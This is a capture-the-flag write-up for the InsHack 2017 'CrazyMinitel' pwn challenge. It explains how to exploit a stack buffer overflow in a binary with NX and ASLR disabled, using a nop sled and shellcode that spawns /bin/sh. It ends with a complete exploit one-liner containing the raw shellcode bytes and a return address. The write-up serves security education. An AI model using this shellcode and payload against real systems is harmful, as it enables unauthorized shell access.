---
title: "CrazyMinitel | InsHack 2017"
categories: ["pwn"]
tags: ["stack overflow", "shellcode"]
Points: 125
Solves: 77
---

Today we will solve a simple pwnable challenge by inserting shellcode on the stack with a nop sled, and then jumping to it.

## Checksec
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled       (<- we CAN use shellcode)
PIE:      No PIE
ASLR:     DISABLED          (<- we CAN realiably know where the stack is)
```

## Solution
The program just echos the input. If the input is large enough the buffer is overflowed, so, since we can use shellcode lets just return to our buffer in the stack and run `execve("/bin/sh", NULL, NULL)`.

We can reliably return to our buffer because we can first get its location in gdb and we know it won't change since ASLR is disabled. The address can change slightly since environment variables are stored on the stack and if for example you change directory, $PWD will have a different value and shift the stack around.

To bypass this we can use a `nop sled`. A nop sled is just a bunch of `nop`s (the assembly instruction for no operation, aka does nothing), making it possible to jump anywhere in the nop sled range and execute our shellcode regardless of jumping perfectly to the start of our shellcode or anywhere in the middle of the `nop`s.

The solution is simply:
 - Send `nop..nop..nop...shellcode` for a total length of 230
 - Send `A`'s to pad until we get to the point on the stack where we are about to overwrite the saved `eip`
 - Overwrite the saved `eip` with a value pointing to somewhere in the middle of the nops (find this in gdb). In this case it was `0xbffffaa0`. We write it as `\xa0\xfa\xff\xbf` because the bytes are stored in little endian

```
./vuln $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.rjust(230,'\x90') + 'A'*(268-230) + '\xa0\xfa\xff\xbf'")
```